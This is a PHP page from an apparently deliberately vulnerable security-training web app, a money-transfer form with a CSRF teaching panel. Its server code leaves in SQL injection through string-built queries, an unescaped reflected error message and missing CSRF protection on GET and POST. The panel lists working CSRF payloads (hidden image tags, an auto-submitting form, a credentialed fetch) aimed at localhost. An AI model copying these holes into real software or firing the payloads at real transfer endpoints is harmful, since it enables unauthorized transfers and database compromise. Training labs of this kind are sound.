<?php
require_once 'config.php';

$conn = getConnection();
$success = '';
$error = '';

// Get current user (default to user 1 for demo)
$current_user_id = $_SESSION['user_id'] ?? 1;
$current_user = null;

$result = $conn->query("SELECT * FROM users WHERE id = $current_user_id");
if ($result && $result->num_rows > 0) {
    $current_user = $result->fetch_assoc();
}

// VULNERABLE: No CSRF token protection
if ($_SERVER['REQUEST_METHOD'] === 'POST' || isset($_GET['to']) && isset($_GET['amount'])) {
    // Accept both POST and GET (makes CSRF easier)
    $to_user = $_POST['to_user'] ?? $_GET['to'] ?? '';
    $amount = floatval($_POST['amount'] ?? $_GET['amount'] ?? 0);
    
    if ($amount <= 0) {
        $error = "Invalid amount";
    } elseif ($amount > $current_user['balance']) {
        $error = "Insufficient balance. You have $" . number_format($current_user['balance'], 2);
    } else {
        // Find recipient
        $stmt = $conn->query("SELECT * FROM users WHERE username = '$to_user' OR id = '$to_user'");
        $recipient = $stmt->fetch_assoc();
        
        if (!$recipient) {
            $error = "Recipient not found: $to_user";
        } elseif ($recipient['id'] == $current_user_id) {
            $error = "Cannot transfer to yourself";
        } else {
            // Perform transfer (no transaction safety)
            $conn->query("UPDATE users SET balance = balance - $amount WHERE id = $current_user_id");
            $conn->query("UPDATE users SET balance = balance + $amount WHERE id = {$recipient['id']}");
            
            // Log transaction
            $conn->query("INSERT INTO transactions (from_user, to_user, amount) VALUES ($current_user_id, {$recipient['id']}, $amount)");
            
            $success = "Successfully transferred $" . number_format($amount, 2) . " to " . htmlspecialchars($recipient['username']);
            
            // Refresh balance
            $result = $conn->query("SELECT * FROM users WHERE id = $current_user_id");
            $current_user = $result->fetch_assoc();
        }
    }
}

// Get all users for dropdown
$users = [];
$result = $conn->query("SELECT id, username FROM users WHERE id != $current_user_id");
while ($row = $result->fetch_assoc()) {
    $users[] = $row;
}

// Get transaction history
$transactions = [];
$result = $conn->query("
    SELECT t.*, 
           u1.username as from_username, 
           u2.username as to_username 
    FROM transactions t 
    LEFT JOIN users u1 ON t.from_user = u1.id 
    LEFT JOIN users u2 ON t.to_user = u2.id 
    WHERE t.from_user = $current_user_id OR t.to_user = $current_user_id 
    ORDER BY t.created_at DESC 
    LIMIT 10
");
while ($row = $result->fetch_assoc()) {
    $transactions[] = $row;
}

$conn->close();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Money Transfer - Security Testing Lab</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <nav class="navbar">
        <div class="nav-container">
            <a href="index.php" class="logo">SecLab</a>
            <div class="nav-links">
                <a href="index.php" class="nav-link">Home</a>
                <a href="login.php" class="nav-link">Login</a>
                <a href="search.php" class="nav-link">Search</a>
                <a href="products.php" class="nav-link">Products</a>
                <a href="profile.php" class="nav-link">Profile</a>
                <a href="comments.php" class="nav-link">Comments</a>
                <a href="upload.php" class="nav-link">Upload</a>
                <a href="transfer.php" class="nav-link active">Transfer</a>
                <a href="admin.php" class="nav-link">Admin</a>
                <a href="api.php" class="nav-link">API</a>
                <a href="decoder.php" class="nav-link">Decoder</a>
            </div>
        </div>
    </nav>

    <div class="container">
        <div class="grid grid-2">
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">💸</div>
                    <div>
                        <div class="card-title">Money Transfer</div>
                        <div class="card-subtitle">Send money to other users</div>
                    </div>
                </div>

                <?php if ($current_user): ?>
                    <div style="background: var(--bg-secondary); border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem;">
                        <p style="color: var(--text-muted); font-size: 0.85rem;">Current Balance</p>
                        <p style="font-size: 2rem; font-weight: 700; color: var(--accent-primary);">
                            $<?php echo number_format($current_user['balance'], 2); ?>
                        </p>
                        <p style="color: var(--text-secondary); font-size: 0.9rem;">
                            Logged in as: <?php echo htmlspecialchars($current_user['username']); ?>
                        </p>
                    </div>
                <?php endif; ?>

                <?php if ($success): ?>
                    <div class="alert alert-success">✅ <?php echo $success; ?></div>
                <?php endif; ?>

                <?php if ($error): ?>
                    <div class="alert alert-error">❌ <?php echo $error; ?></div>
                <?php endif; ?>

                <!-- VULNERABLE: No CSRF token -->
                <form method="POST" action="transfer.php">
                    <div class="form-group">
                        <label class="form-label">Recipient</label>
                        <select name="to_user" class="form-select" required>
                            <option value="">Select recipient...</option>
                            <?php foreach ($users as $user): ?>
                                <option value="<?php echo htmlspecialchars($user['username']); ?>">
                                    <?php echo htmlspecialchars($user['username']); ?>
                                </option>
                            <?php endforeach; ?>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="form-label">Amount ($)</label>
                        <input type="number" name="amount" class="form-input" step="0.01" min="0.01" placeholder="0.00" required>
                    </div>
                    <button type="submit" class="btn btn-primary" style="width: 100%;">Transfer Money</button>
                </form>

                <?php if (count($transactions) > 0): ?>
                    <div style="margin-top: 2rem;">
                        <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">Transaction History</h4>
                        <div class="table-container">
                            <table>
                                <thead>
                                    <tr>
                                        <th>From</th>
                                        <th>To</th>
                                        <th>Amount</th>
                                        <th>Date</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($transactions as $t): ?>
                                        <tr>
                                            <td><?php echo htmlspecialchars($t['from_username']); ?></td>
                                            <td><?php echo htmlspecialchars($t['to_username']); ?></td>
                                            <td>$<?php echo number_format($t['amount'], 2); ?></td>
                                            <td style="font-size: 0.85rem;"><?php echo $t['created_at']; ?></td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                <?php endif; ?>
            </div>

            <div class="card">
                <div class="card-header">
                    <div class="card-icon">🎯</div>
                    <div>
                        <div class="card-title">CSRF Attack Testing</div>
                        <div class="card-subtitle">Cross-Site Request Forgery</div>
                    </div>
                </div>

                <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">⚠️ Vulnerabilities</h4>
                <ul style="color: var(--text-secondary); margin-left: 1.5rem; margin-bottom: 1.5rem;">
                    <li>No CSRF token protection</li>
                    <li>Accepts GET requests for transfers</li>
                    <li>No confirmation step</li>
                    <li>No re-authentication for sensitive action</li>
                </ul>

                <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">🔗 GET-based CSRF</h4>
                <p style="color: var(--text-secondary); margin-bottom: 0.5rem;">Direct link attack:</p>
                <div class="code-block">
&lt;a href="http://localhost/security-testing/transfer.php?to=admin&amount=100"&gt;
  Click for free money!
&lt;/a&gt;

&lt;img src="http://localhost/security-testing/transfer.php?to=admin&amount=500" style="display:none"&gt;
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">📝 POST-based CSRF</h4>
                <p style="color: var(--text-secondary); margin-bottom: 0.5rem;">Hidden form attack:</p>
                <div class="code-block">
&lt;form action="http://localhost/security-testing/transfer.php" method="POST" id="csrf"&gt;
  &lt;input type="hidden" name="to_user" value="attacker"&gt;
  &lt;input type="hidden" name="amount" value="1000"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">🖼️ Image Tag CSRF</h4>
                <div class="code-block">
&lt;img src="http://localhost/security-testing/transfer.php?to=hacker&amount=999" width="0" height="0"&gt;
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">⚡ XHR CSRF (if CORS misconfigured)</h4>
                <div class="code-block">
fetch('http://localhost/security-testing/transfer.php', {
  method: 'POST',
  credentials: 'include',
  body: 'to_user=attacker&amount=500'
});
                </div>

                <div class="alert alert-info" style="margin-top: 1.5rem;">
                    💡 <strong>Test:</strong> Try this URL directly:<br>
                    <code style="font-size: 0.8rem;">transfer.php?to=admin&amount=50</code>
                </div>
            </div>
        </div>
    </div>
</body>
</html>

